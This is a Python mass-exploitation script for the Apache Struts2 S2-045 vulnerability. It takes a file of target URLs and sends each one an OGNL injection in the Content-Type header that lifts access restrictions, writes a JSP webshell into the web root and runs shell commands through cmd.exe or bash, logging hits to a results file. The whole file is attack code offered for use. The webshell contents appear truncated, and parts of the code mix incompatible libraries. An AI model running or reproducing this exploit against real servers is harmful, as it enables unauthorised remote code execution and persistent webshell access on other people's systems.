#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ------------------------------------------------------------------------------
# Name:        struts2 045 exploit tools
# Author:      pirogue
# Created:     2017年3月2日12:48:09
# Site:        http://www.pirogue.org
# useage:      python pi_struts2-045.py xxx.txt 5
# ------------------------------------------------------------------------------

import sys
import time
import httpx
import asyncio
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers

class Pi_Struts2_045(object):
    """init variables"""
    def __init__(self, sthreads, num):
        self.stime = time.strftime("%Y-%m-%d%H%M%S", time.localtime())
        self.sthreads = sthreads
        self.datagen, self.header = multipart_encode(
            {"image1": open("tmp.txt", "rb")}
        )

        self.header["User-agent"] = "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D257 MicroMessenger/6.0.1 NetType/WIFI"

        self.webshell_txt_1 = '%3%3E'
        self.webshell_txt_2 = '%3C%3E'
        self.webshell_txt_3 = '%3C%25%3E'
        self.webshell_txt_4 = '%3C%3E'
        self.webshell_txt_5 = '%3C%3E'
        self.webshell_txt_6 = '%3C%3E'
        self.webshell_txt_7 = '%3C%3E'
        self.num = str(num)
        self.header["Content-Type"] = "%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ccccc='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getSession().getServletContext().getRealPath('/')).(#shell='" + eval("self.webshell_txt_"+ self.num)+"').(new java.io.BufferedWriter(new java.io.FileWriter(#path+'/"+self.num+"t00ls.jsp').append(new java.net.URLDecoder().decode(#shell,'UTF-8'))).close()).(#cmd='echo \\\"write file to '+#path+'/"+ self.num +"t00ls.jsp\\\"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

    async def spost_exp(self, ck_url):
        """post payload"""
        try:
            register_openers()
            async with httpx.AsyncClient() as client:
                response = await client.post(ck_url, data=self.datagen, headers=self.header, timeout=5)
                res = response.text
                self.ensure(res, ck_url)
        except Exception as e:
            print(f"error--->{ck_url}: {e}")

    def ensure(self, res, shost):
        """output struts2 045 res"""
        print(res)
        if "7t00ls" in res:
            with open(self.stime+'result.txt', 'a') as f_s:
                f_s.write(res + shost)

    async def check_url(self, url_txt):
        'check url list'
        with open(url_txt, 'r') as c_f:
            tasks = []
            async with httpx.AsyncClient() as client:
                for url in c_f:
                    tasks.append(self.spost_exp(url.strip()))
                await asyncio.gather(*tasks)

def main():
    """useage: python pi_struts2-045.py xxx.txt 5"""
    for i in range(1, 8):
        exploit = Pi_Struts2_045(int(sys.argv[2]), i)
        asyncio.run(exploit.check_url(str(sys.argv[1])))

if __name__ == '__main__':
    main()